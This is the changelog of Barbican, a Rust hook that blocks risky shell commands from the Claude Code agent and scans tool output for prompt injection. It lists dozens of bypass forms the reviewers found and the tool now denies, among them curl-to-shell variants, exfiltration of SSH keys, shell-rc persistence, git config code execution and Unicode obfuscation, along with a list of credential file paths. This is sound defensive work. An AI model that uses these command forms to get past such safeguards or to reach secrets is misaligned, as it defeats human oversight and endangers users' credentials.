# Changelog

All notable changes to Barbican are documented here. Format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); version numbers follow [SemVer](https://semver.org/).

## [1.2.0] — 2026-05-02

Adversarial-security hardening release. Closes **54 SEVERE + HIGH findings** across **eight consecutive adversarial review rounds** (Claude `crew:code-reviewer` + GPT via cursor-agent). Every finding shipped with a red-test-first PoC. Not a feature release — no new capabilities; every change narrows a concrete bypass.

The roadmap from here:
- **1.2.1**: MEDIUM / LOW cleanup items deferred from these reviews.
- **1.3.0**: fuzzing infrastructure (cargo-fuzz / afl) as the primary termination mechanism for "is the classifier complete?" questions. Review-based iteration has diminishing returns beyond this point; fuzzing can explore the bypass surface more exhaustively.

Review rounds and findings count:
| Round | Source | SEVERE | HIGH | Notable classes |
| ----- | ------ | ------ | ---- | --------------- |
| 1st–3rd | Original audit | 10 | 11 | See section below ("Original audit findings") |
| 4th | GPT 4th-pass | 2 | 0 | GNU bundled short-flags (`cp -vt`, `sed -ni`) |
| 5th | Claude + GPT | 6 | 4 | curl>>(bash) procsub, busybox/unshare/systemd-run, rsync -e, xargs amplifier, safe_read ALLOW+symlink, env -S attached, ssh host 'inner', git -c core.X RCE, scripting-lang shellout, chmod+x of attacker-path |
| 6th | Claude + GPT | 4 | 3 | docker --entrypoint=, firejail/bwrap wrappers, ssh ProxyCommand, git -c attached/alias/submodule/env-config, scripting obfuscation, macOS $TMPDIR |
| 7th | Claude + GPT | 3 | 3 | docker `--entrypoint=`, strace/flock/gosu/torify wrappers, ssh -o space form, git -C pivot, hex/unicode escapes, ssh -F attacker config |
| 8th | Claude + GPT | 2 | 6 | GIT_DIR= env-var pivot, ssh -F relative/stdin, tar --to-command / --checkpoint-action=exec, container family (buildah/nerdctl/ctr/kubectl), pip install git+, crontab/at/systemd-timer, octal/named-unicode escape obfuscation |
| **Total** | | **17 new** | **16 new** | **33 additional 4th-8th passes** |
| Plus original | | 10 | 11 | 21 from the initial audit |
| | | **27** | **27** | **54 total closures** |

### Security — pre-bash classifier

- **SEVERE S1**: `time`, `command`, `builtin`, `exec` added to `REENTRY_WRAPPERS`. These are transparent shell-builtin wrappers that prefix an inner command without `-c`; without them `time curl | bash`, `command bash -c 'curl|bash'`, `exec /bin/bash -c 'curl|bash'` and `exec -a legit /bin/bash -c 'curl|bash'` all exited 0. `exec -a NAME` now consumes NAME as a value-taking flag so prefix-runner correctly identifies the inner command.
- **SEVERE S2 + S6**: heredoc body capture. The parser's `Redirect` struct gains `body: Option<String>` populated from the `heredoc_body` child node. New `shell_with_heredoc_or_herestring_body` classifier re-parses the body when argv[0] is a shell interpreter and runs the nested script through `classify_script_with_depth`. Previously `bash <<< "curl|bash"` and `bash <<EOF\ncurl|bash\nEOF` were full H1 bypasses.
- **SEVERE S3**: `source` / `.` treated as H1 shell sinks. `curl url | . /dev/stdin` is a full download-and-execute equivalent that the narrow `SHELL_INTERPRETERS` set missed.
- **SEVERE S4**: closed alongside S1 via `exec -a` flag handling.
- **SEVERE S5 + S6**: new `persistence_write_to_shell_startup` classifier. Writes to shell rc / login files (basename match) OR persistence-class directory markers (path substring: `/etc/profile.d/`, `/.config/fish/`, `/.config/systemd/user/`, `/.local/share/systemd/user/`, `/.config/autostart/`, `/Library/LaunchAgents/`, `/Library/LaunchDaemons/`) now deny regardless of payload content. `SHELL_RC_FILES` set widened with `config.fish`, `fish_variables`, `.inputrc`. Previously `echo "curl x | sh" >> ~/.bashrc` slipped through because the payload itself didn't contain exfil-shape tokens.
- **SEVERE GPT #1** (substitution boundary): new `shell_with_network_substitution` classifier. `bash <(curl url)`, `sh <<<"$(curl url)"`, and `. <(curl url)` are full H1-equivalents that the per-stage H1 check didn't cross because the outer pipeline is 1-stage and the network tool lived inside a substitution. Also closes the documented Phase-4 gap `bash -c "$(curl url)"`.
- **SEVERE GPT #2** (H2 non-tail decoder): H2 rule 1 checked only the pipeline tail's redirect. `base64 -d > /tmp/p.sh | cat > /dev/null` let the decoder write in a non-tail position. Rule 1 now iterates every stage.
- **HIGH H-1**: NFKC normalization on argv[0] in the parser. Fullwidth `Ｃurl` (U+FF23 + "url") folds to ASCII `Curl` under NFKC, which on case-insensitive APFS/NTFS executes the real `curl` binary. `argv0_raw` retains the attacker's original spelling for deny-reason display.
- **HIGH H-2**: `command_name` grammar-node handling. `"ba""sh" -c 'curl|bash'` has `command_name > concatenation > [string, string]`; the previous raw-byte fallback returned `"ba""sh"` with the quotes intact. Now `extract_word_text` recurses into `command_name`'s children.
- **HIGH H-3** (deny-by-default violation): malformed hook JSON now exits DENY, not ALLOW. Previously any `serde_json::from_str` failure mapped to `EXIT_ALLOW` — a full classifier bypass whenever the attacker could influence JSON shape. Escape hatch: `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1` restores the pre-1.2.0 behavior if Claude Code itself ever breaks the hook contract while you investigate.
- **HIGH GPT #11** (expansion-argv[0] exfil): `NET=curl; cat ~/.ssh/id_rsa | $NET url` bypassed the secret-to-network classifier because basename lookup saw `$NET` verbatim. In risk contexts (pipeline mentions a secret), any stage whose argv[0] raw text starts with `$` is now treated as a potential network tool. Benign expansion-argv[0] pipelines without secrets are unaffected.

### Security — post hooks and MCP tools

- **HIGH H-4**: widened `SHELL_RC_FILES` (see above) + symlink-target resolution in `post_edit` sensitive-path scan. A write to `docs/notes.md -> ~/.zshrc` now canonicalizes and scans both the requested and resolved paths.
- **HIGH H-5** (env-var zero floor): `BARBICAN_SCAN_MAX_BYTES`, `BARBICAN_SAFE_FETCH_MAX_BYTES`, `BARBICAN_SAFE_FETCH_TIMEOUT_SECS`, `BARBICAN_SAFE_READ_MAX_BYTES` now enforce minimum floors (4 KiB body, 1 s timeout). An attacker-influenced env with `MAX_BYTES=0` no longer disables the scanner.
- **HIGH H-6** (env-flag consistency): new `env_flag()` helper accepts `1` / `true` / `yes` / `on` (case-insensitive). Retrofitted `allow_ip_literals`, `BARBICAN_GIT_HARD_DENY`, `allow_sensitive_override`. Users who set `BARBICAN_GIT_HARD_DENY=true` in an `.envrc` previously got silent no-protection.
- **HIGH H-7**: audit log parent-dir `chmod` is now gated on `symlink_metadata().is_dir() && !is_symlink()`. A pre-planted symlink `~/.claude/barbican -> /etc/` no longer turns into `chmod 0o700 /etc/`.
- **HIGH H-8** (ancestor symlink walk): safe_read's allow-rule symlink check was leaf-only. An attacker who controls an ancestor directory under `$HOME` could laundry an allow path via a symlink higher up. `path_contains_symlink` now walks ancestors under `$HOME`; ancestors above `$HOME` (platform fixtures like macOS `/var → /private/var`) stay exempt.
- **HIGH GPT #16** (installer binary symlink clobber): `copy_binary` used `fs::copy(src, dst)`, which follows symlinks at `dst`. An attacker pre-planting `~/.claude/barbican/barbican` as a symlink to (e.g.) `~/.bashrc` would have the real binary written to the symlink target. Binary staging now uses the same `O_NOFOLLOW + O_EXCL + fsync + rename` discipline the JSON writers use.
- **MEDIUM M-3 + GPT HIGH** (post-mcp prefix trust): the `mcp__barbican__*` tool skip was a string prefix. A third-party MCP server that registered a tool name starting with that prefix (`mcp__barbican__evil`, `mcp__barbican__safe_fetch_v2`, …) slipped unsanitized prompt-injection past the scanner. Replaced with an exact allowlist of the three Barbican-internal tool IDs.

### Accepted out-of-scope (SECURITY.md §Untrusted-launch environment)

- **GPT HIGH #14 + #15** (safe_read env knobs + HOME poisoning): an attacker who controls Barbican's launch environment can set `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`, `BARBICAN_SAFE_READ_ALLOW=/path`, `BARBICAN_ALLOW_IP_LITERALS=1`, or relocate `HOME`. These are documented opt-outs; an attacker with launch-env control can already set `PATH`, `LD_PRELOAD`, or replace the Barbican binary. Documented as out-of-scope rather than patched. SECURITY.md section added.

### Added

- `env_flag()` helper (public in `lib.rs`) for uniform truthy-env parsing.
- `MIN_SCAN_MAX_BYTES = 4096`, `MIN_MAX_BYTES = 4096` (safe_fetch + safe_read), `MIN_TIMEOUT_SECS = 1` constants exposed for testability.
- `is_expansion_argv0`, `is_h1_shell_sink`, `persistence_write_to_shell_startup`, `shell_with_heredoc_or_herestring_body`, `shell_with_network_substitution` classifiers (in `pre_bash.rs`).
- `PERSISTENCE_PATH_MARKERS` const (in `pre_bash.rs`).
- `Redirect.body: Option<String>` field (in `parser.rs`) for heredoc body capture.
- `write_bytes_atomic_with_mode` helper (in `installer.rs`) — splits mode from the existing atomic-write helper so binary staging can use 0o755.

### Security — iterative adversarial rounds (4th–8th pass additions)

After the original 21 findings closed, five more rounds of adversarial review surfaced increasingly exotic attack classes. Each round closed before the next began; the rest remain documented as known-OOS below.

**GNU argv-parsing edges (4th pass)**
- `cp -vt /etc/profile.d SRC` / `install -mvt DIR SRC` / `sed -ni '…' ~/.bashrc` — bundled short-flag forms where the value-taking letter is at the tail of a cluster. New `short_flag_contains` helper; `target_directory_flag` recognizes `-[A-Za-z]+t` bundles.

**New classifier families (5th pass)**
- `network_with_shell_sink_substitution`: `curl > >(bash)` / `curl | tee >(bash)` procsub execution.
- `extract_wrapper_inner` covers `busybox`, `toybox`, `unshare`, `systemd-run`, `chpst`.
- `rsync_dash_e_inner`: `rsync -e 'bash -c "curl|bash"'` re-classifies the `-e` value.
- `xargs_arbitrary_amplifier`: deny `xargs -I{} bash -c '{}'`.
- `enforce_policy` in `safe_read` now runs the symlink walk unconditionally (override bypasses deny-list only).
- `extract_env_dash_s` handles attached + bundled forms (`env -S'cmd'`, `env -iS'cmd'`).
- `extract_ssh_remote_command`: `ssh host 'inner-bash'` re-classifies the remote argv.
- `git_config_injection`: narrow deny for `-c core.fsmonitor=`/`core.pager=!`/`protocol.ext.allow=`/etc.
- `scripting_lang_shellout`: python/perl/ruby/node/php/awk `-c`/`-e`/`BEGIN{…}` scanned for curl|bash.
- `chmod_plus_x_attacker_path`: deny chmod+x targeting `/tmp`, `/var/tmp`, `/dev/shm`, `~/Downloads`, `~/.cache`.

**Container and sandbox coverage (6th–8th pass)**
- Wrappers: `firejail`, `bwrap`, `docker`, `podman`, `runc`, `crun` (6th), plus `strace`, `ltrace`, `valgrind`, `catchsegv`, `flock`, `gosu`, `fakeroot`, `torify`, `proxychains{,4}` (7th), plus `buildah`, `nerdctl`, `ctr`, `lxc-attach`, `apptainer`, `singularity`, `kubectl` (8th). `extract_container_run_inner` handles `docker run --entrypoint=sh alpine -c CODE` (attached `=` form, 7th-pass Claude+GPT co-finding).
- `flock LOCK -c CMD` special-cased before prefix-runner to avoid mis-treating `-c` as the lock-file value.
- `ssh_uses_attacker_config`: deny `ssh -F ./evil.conf`, `-F -`, `-F /dev/stdin`, and any `-F PATH` not ending in a standard `~/.ssh/config` / `/etc/ssh/ssh_config{,.d}` location.

**Git expansion**
- `git_config_injection` (6th pass): attached `-cKEY=VAL`, `--config-env=KEY=ENV`, `alias.*=!cmd` / `submodule.*.update=!cmd` / `includeif.*.path` prefix classes; additional exact keys (`core.gpgprogram`, `gpg.program`, `gpg.ssh.program`, `gpg.x509.program`, `include.path`, `credential.helper`).
- `git -C DIR` / `--git-dir=DIR` / `--work-tree=DIR` pivots into attacker-writeable dirs (7th pass).
- `GIT_DIR=`/`GIT_SSH_COMMAND=`/`GIT_PAGER=`/`GIT_EDITOR=`/`GIT_ASKPASS=`/`GIT_EXTERNAL_DIFF=`/`GIT_PROXY_COMMAND=` env-var prefix assignments (8th pass). Parser exposes `Command::assignments` captured from `variable_assignment` nodes preceding the command word.

**LOLBin and persistence**
- `tar --to-command=CMD` and `tar --checkpoint-action=exec=CMD` (8th pass), plus GNU long-option prefix abbreviations (`--to-com=`, `--checkpoint-ac=exec=`).
- `pip_editable_vcs_install`: deny `pip/pip3/pipx/uv/poetry install git+URL` / `install https://…/pkg.tar.gz` / PEP 508 `name @ git+…` — all run arbitrary install-time code.
- `scheduler_persistence`: deny `crontab -`, `crontab -r`, `crontab -e`, `at TIME`, `batch`, `systemd-run --on-calendar=…`. `crontab -l` (read-only) allowed.

**Scripting-language obfuscation**
- `scripting_lang_shellout` now handles `python/perl/ruby/node/php/awk` plus 6th-pass additions: `julia`, `swift`, `racket`, `guile`, `sbcl`, `lua`, `tclsh`, `rscript`.
- `code_has_obfuscation_marker` detects ≥3 of: `\xHH` hex escapes, `\uHHHH` unicode ASCII-range escapes, `\OOO` octal escapes, `\N{…}` named-unicode escapes. Plus string concatenation across `+`, `string-append`, `.`, `..`, `<>`, `concat(`.
- `code_calls_subprocess` covers Python/Perl/Ruby/PHP/Node/Lua/Tcl/C-ccall/S-expression/Ruby `%x{}` / Perl `qx{}` / bare-backtick-plus-command-and-space forms.

**Path normalization**
- `lex_normalize_chmod_path` collapses `//` / `.` / `..` components; comparisons case-folded on macOS/Windows (APFS/NTFS default). macOS `$TMPDIR` (`/var/folders/`, `/private/var/folders/`) and Linux systemd `/run/user/` added to attacker-writeable list.

**Added in 4th–8th pass**
- `Command.assignments: Vec<(String, String)>` (parser): exposes `VAR=VAL` assignments that prefix a command word.
- `extract_ssh_dangerous_option`, `ssh_uses_attacker_config` (ssh).
- `extract_container_run_inner`, `is_container_entrypoint_shell`.
- `git_config_injection` (expanded with env-var / prefix / attached / pivot coverage).
- `scripting_lang_shellout`, `code_calls_subprocess`, `code_has_obfuscation_marker`, `count_hex_escapes`, `count_unicode_bmp_ascii_escapes`, `count_octal_ascii_escapes`, `count_named_unicode_escapes`.
- `chmod_plus_x_attacker_path`, `is_chmod_exec_mode_token`, `path_in_attacker_writable_dir`, `lex_normalize_chmod_path`.
- `xargs_arbitrary_amplifier`, `rsync_dash_e_inner`, `pip_editable_vcs_install`, `tar_command_exec`, `scheduler_persistence`.
- `network_with_shell_sink_substitution`, `script_contains_shell_sink_transitively`, `redirect_target_is_shell_sink_procsub`.

### Accepted out-of-scope additions (SECURITY.md)

Findings deferred by deliberate choice — documented in `SECURITY.md`:
- **Stateful cross-command attacks**: `cd /tmp/evil && git log` — Barbican sees one command at a time via `PreToolUse`; cwd tracking across hook invocations is out of scope for a single-binary classifier.
- **`tar` non-GNU implementations**: the prefix-abbreviation defense targets GNU `getopt_long`. BSD / mock-tar implementations with different abbreviation behavior may accept forms we don't match.
- **Symbolic links outside `$HOME`**: `safe_read` anti-laundering walk stops at `$HOME` to avoid false positives on platform fixtures (macOS `/var → /private/var`). System-level ancestor symlinks are explicitly out of scope.
- **`docker exec` / `docker compose exec` / `ctr exec`** inside an already-running container: the inner `bash -c` is classified, but we don't try to parse the container's own option grammar for unknown subcommands.
- **Out-of-process env vars**: launch-time `PATH`, `LD_PRELOAD`, `HOME` manipulation remains out of scope (attacker with launch-env control already owns the process).

### Testing

- **~120 new red-test-first PoC cases** across `pre_bash_h1`, `pre_bash_h2`, `pre_bash_m1`, `pre_bash_m2`, `post_mcp`, `install`, `safe_read` (plus initial 45 from the 1st–3rd passes). Every SEVERE / HIGH finding has at least one concrete PoC pinned.
- **733 total tests** green; clippy clean on Rust 1.91 (`--all-targets --all-features -D warnings`).

## [1.1.0] — 2026-05-01

Polish release — closes the Phase-1 post-review below-medium follow-ups and the Phase-8 redirect-hop TOCTOU. No audit findings open. Roadmap retires: remaining work moves to GitHub issues.

### Changed

- **`safe_fetch` reads `BARBICAN_ALLOW_IP_LITERALS` once per fetch.** Defense-in-depth against in-process env mutation: previously the env was re-read by `validate_url` on every redirect hop, so any code running in the Barbican process that called `std::env::set_var` between hops could toggle policy mid-fetch. No known external attacker path exercised this; the narrowing removes the surface rather than patching a known bypass. Now the flag is captured once at entry of `fetch()` and passed down as an explicit bool. Internal API: new `pub(crate) validate_url_with(s, allow: bool)` in `net`; `validate_url` becomes a thin env-reading wrapper.

### Added

- **Defense-in-depth parser tests** (integration, `tests/parser.rs`):
  - `deeply_nested_command_substitutions_are_denied` — 200 levels of `$(...)` returns `Malformed` (pins `MAX_DEPTH = 100`).
  - `very_long_pipeline_parses_without_stack_overflow` — 500-stage pipeline parses and surfaces every stage to classifiers.
  - `multi_megabyte_argument_word_parses_in_bounded_time` — 5 MiB argv word parses cleanly.
- **Unit tests for `validate_url_with`**: explicit-false rejects raw IPs even when env override is on; explicit-true permits public IPs and still blocks loopback.

### Deferred to GitHub issues

- `safe_fetch` happy-path integration test — requires a resolver/connector abstraction in `fetch()`. Existing tests cover every rejection path; the happy-path test is not release-blocking.
- Any other below-medium follow-ups surfaced by later review.

## [1.0.0] — 2026-05-01

Initial release. Rust port of [Narthex](https://github.com/fitz2882/narthex) (pinned at commit `071fec0`) with every finding from the upstream security audit fixed and pinned by a regression test.

### Added

- **`barbican pre-bash`** hook (PreToolUse): denies dangerous bash compositions before Claude Code executes them.
  - H1: `curl|wget` piped into any shell interpreter, including basename-normalized variants (`/usr/bin/bash`, `/bin/sh`, …).
  - H2: staged decode-to-exec pipelines — `base64 -d | bash`, `xxd -r | sh`, `openssl enc -d | bash`, cross-command staging (`base64 -d > /tmp/x.sh; bash /tmp/x.sh`).
  - M1: re-entry wrappers that hide inner commands — `find -exec`, `xargs`, `sudo`, `timeout`, `nohup`, `env`, `watch`, `nice`, `parallel`, `su -c`, `doas`, `runuser`, `setsid`, `stdbuf`, `unbuffer`.
  - M2: DNS-channel exfil — `dig`, `host`, `nslookup`, `drill`, `resolvectl` composed with secret-read pipelines. Split `git` from the hard-deny into the configurable ask-list (`BARBICAN_GIT_HARD_DENY=1` to promote).
  - `tree-sitter-bash` parser foundation with `ParseError::Malformed` → hard-deny on unclean parse, per Barbican's deny-by-default rule.
- **`barbican post-edit` / `barbican post-mcp`** hooks (PostToolUse): scan tool output for prompt-injection patterns.
  - M3: NFKC normalization (fullwidth Latin, mathematical alphanumerics, compatibility ligatures), zero-width + bidi-override + isolate stripping, HTML-tag stripping with per-pass attribution, configurable scan cap (`BARBICAN_SCAN_MAX_BYTES`, default 5 MB) with explicit `scan-truncated` warning.
- **`barbican audit`** hook (all PostToolUse events): append-only audit log at `~/.claude/barbican/audit.log`, mode `0o600`, ANSI escape sequences stripped before write.
- **`barbican mcp-serve`** — stdio MCP server exposing three tools (rmcp 1.5):
  - `safe_fetch` — RFC1918 / loopback / link-local / CGNAT / IMDS SSRF filter; DNS-pinned connection (resolve once, connect by IP, send original Host header); raw-IP literals rejected unless `BARBICAN_ALLOW_IP_LITERALS=1`; redirects manually re-validated per hop (M4).
  - `safe_read` — sensitive-path deny list (default: `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gh`, `~/.netrc`, `~/.docker/config.json`, `~/.kube/config`, `~/.git-credentials`, `~/.config/git/credentials`, `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials(.toml)?`, `/etc/ssh`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d`, `.env`, `.envrc`); canonicalization through symlinks; `BARBICAN_SAFE_READ_*` knobs for extra-deny / allow-carveout / max-bytes (L3).
  - `inspect` — runs the sanitizer on in-context text and returns a plain-text attribution report (NFKC bytes delta, control-character counts, HTML tag attribution, sentinel neutralization hits).
- **`barbican install` / `barbican uninstall`** — Rust replacement for Narthex's Python `install.py`.
  - Atomic writes via `create_new(true)` + `O_NOFOLLOW` (custom-flags) + fsync + rename; PID-scoped tmp path; mode `0o600` on all config writes.
  - Backs up `~/.claude/settings.json` and `~/.claude.json` to `*.pre-barbican` exactly once; torn or invalid backups detected and repaired.
  - Malformed user config surfaces a structured error (never panics); non-UTF-8 binary paths rejected explicitly.
  - Uninstall strips only Barbican-owned entries (Path-component matching, not substring) and prunes the empty `permissions` / `hooks` scaffolding it created.
  - `--dry-run` and `--keep-files` both supported.
- **Build & packaging**: single static binary on `aarch64-apple-darwin` with `lto = "fat"`, `codegen-units = 1`, `panic = "abort"`, `strip = "symbols"`. CI matrix (ubuntu-latest + macos-latest) runs `cargo fmt --check`, `cargo clippy --all-targets --all-features -- -D warnings`, `cargo test --all-targets --all-features`, `cargo audit --deny warnings`, and a release-target build.

### Security

- **All H-finding and M-finding audit recommendations implemented.** See `SECURITY.md` for the threat model, in-scope / out-of-scope attack classes, documented parser limits, and configuration knobs.
- **Unsafe code forbidden** at the workspace level (`unsafe_code = "forbid"`).
- **Dependency audit**: `cargo audit` clean at release. One advisory (`RUSTSEC-2026-0118`, NSEC3 validation DoS in `hickory-proto`) is ignored with documented rationale in `SECURITY.md` — Barbican does not enable any DNSSEC feature on `hickory-resolver`, so the vulnerable code path is not compiled in.

### Attribution

Clean-room port of [Narthex](https://github.com/fitz2882/narthex) by @fitz2882 (MIT). No upstream Rust code vendored. The pinned snapshot at `refs/narthex-071fec0/` is retained as specification only.
